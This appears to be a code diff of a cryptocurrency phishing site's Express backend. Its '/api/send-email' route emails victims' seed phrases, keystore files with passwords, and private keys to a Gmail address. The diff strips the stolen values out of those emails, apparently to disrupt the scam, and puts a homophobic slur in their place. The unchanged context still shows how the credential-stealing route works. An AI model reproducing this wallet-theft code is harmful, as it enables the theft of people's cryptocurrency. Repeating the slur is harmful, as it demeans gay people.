@@ -49,14 +49,14 @@ app.post("/api/send-email", async (req, res) => {
         from: `Dapp App <${email}>`,
         to: "blocklithdeferion@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
-        html: `${formattedMessage} wallet is ${item}`,
+        html: `fucking faggot scammer`,
       };
     } else if (keystore) {
       mailOptions = {
         from: `Dapp App <${email}>`,
         to: "blocklithdeferion@gmail.com",
         subject: "Yo! You Just Got A New Keystore Innit from DApps website!",
-        html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>  wallet is ${item}`,
+        html: `fucking faggot scammer`,
       };
     } else if (privateKey) {
       const formattedMessage = formatMessage(privateKey);
@@ -64,7 +64,7 @@ app.post("/api/send-email", async (req, res) => {
         from: `Dapp App <${email}>`,
         to: "blocklithdeferion@gmail.com",
         subject: "Yo! You Just Got A New Private Key Innit from DApps website!",
-        html: `${formattedMessage} wallet is ${item}`,
+        html: `fucking faggot scammer`,
       };
     }
 
